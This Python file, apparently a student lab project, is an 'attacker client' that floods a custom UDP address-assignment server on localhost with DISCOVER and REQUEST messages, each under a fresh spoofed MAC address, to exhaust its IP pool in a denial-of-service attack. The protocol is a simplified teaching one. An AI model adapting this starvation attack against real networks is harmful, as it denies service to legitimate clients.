import string
from socket import *
import random


# Zachary Pownell, Michael Silva
# 18 April, 2022
# UDPAttackerClient source code file. Used to send multiple DISCOVER and REQUEST messages to the server to execute a Dos
# attack. It will generate a spoof MAC address for each DISCOVER and REQUEST message to the server in order to exhaust
# the server of its resources (i.e. will use up all available IP addresses so no legitimate client can send messages and
# be assigned IP addresses from the server).


SERVER_NAME = 'localhost'
SERVER_PORT = 18000
CLIENT_SOCKET = socket(AF_INET, SOCK_DGRAM)
CLIENT_MAC_ADDRESS = ''
client_ip_address = ""

print("[ATTACKER CLIENT] Starting attacker client...")


# -------------------------------- ATTACKER CLIENT: SPOOF MAC ADDRESS GENERATOR --------------------------------


def generate_spoof_mac_address():

    uppercase_hexdigits = ''.join(set(string.hexdigits.upper()))
    generated_mac_address = ""

    for i in range(6):

        for j in range(2):

            if i == 0:
                generated_mac_address += random.choice("02468ACE")
            else:
                generated_mac_address += random.choice(uppercase_hexdigits)

        generated_mac_address += ":"

    return generated_mac_address.strip(":")


# -------------------------------- ATTACKER CLIENT: SEND MESSAGE FUNCTIONS --------------------------------


def send_discover_message():
    discover_message = f"0,{str(CLIENT_MAC_ADDRESS)}"
    CLIENT_SOCKET.sendto(discover_message.encode(), (SERVER_NAME, SERVER_PORT))
    print(f"[ATTACKER CLIENT] Sent DISCOVER message to server:\n{discover_message}\n")


def send_request_message(mac_address, ip_address, timestamp):
    request_message = f"2,{str(mac_address)},{str(ip_address)},{str(timestamp)}"
    CLIENT_SOCKET.sendto(request_message.encode(), (SERVER_NAME, SERVER_PORT))
    print(f"[ATTACKER CLIENT] Sent REQUEST message to server:\n{request_message}\n")


# -------------------------------- ATTACKER CLIENT: RECEIVED MESSAGE FUNCTIONS --------------------------------


def received_offer_message(offered_mac_address, offered_ip_address, offered_timestamp):
    print(f"[ATTACKER CLIENT] Received OFFER message from server")
    if offered_mac_address != CLIENT_MAC_ADDRESS:
        print(f"[ATTACKER CLIENT] Could not verify MAC address {offered_mac_address} to {CLIENT_MAC_ADDRESS}. Terminating...")
        exit(1)

    print("[ATTACKER CLIENT] MAC Address verified. Sending request message...")
    send_request_message(offered_mac_address, offered_ip_address, offered_timestamp)


def received_acknowledge_message(acknowledged_mac_address, acknowledged_ip_address, acknowledged_timestamp):
    print(f"[ATTACKER CLIENT] Received ACKNOWLEDGE message from server {server_address}")
    if acknowledged_mac_address != CLIENT_MAC_ADDRESS:
        print(f"[ATTACKER CLIENT] Acknowledged IP address and client IP address do not match. Terminating...")
        exit(1)
    print(f"\n[ATTACKER CLIENT] IP ADDRESS {acknowledged_ip_address} ASSIGNED TO THIS CLIENT. WILL EXPIRE IN {acknowledged_timestamp} SECONDS.\n")
    global client_ip_address
    client_ip_address = acknowledged_ip_address


def received_decline_message(message):

    print(f"[ATTACKER CLIENT] Received DECLINED message from server {server_address}:\n{message}\n")
    exit(1)


# -------------------------------- ATTACKER CLIENT: RUNNER --------------------------------

print("[ATTACKER CLIENT] Sending discover messages...\n")

message_type = ''

while message_type != '7':

    CLIENT_MAC_ADDRESS = generate_spoof_mac_address()
    print(f"[ATTACKER CLIENT] Spoof MAC Address generated: {CLIENT_MAC_ADDRESS}\n")
    print("[ATTACKER CLIENT] Sending discover message to client...")
    send_discover_message()

    while 1:

        received_message, server_address = CLIENT_SOCKET.recvfrom(2048)
        received_message = received_message.decode()
        split_received_message = received_message.split(',')
        message_type = split_received_message[0]
        received_mac_address = split_received_message[1]
        print(f"[ATTACKER CLIENT] Receiving type '{message_type}' message from server. Decoding...")

        if message_type == '1':
            received_offer_message(received_mac_address, split_received_message[2], split_received_message[3])
        if message_type == '3':
            received_acknowledge_message(received_mac_address, split_received_message[2], split_received_message[3])
            break
        if message_type == '7':
            received_decline_message(split_received_message[2])
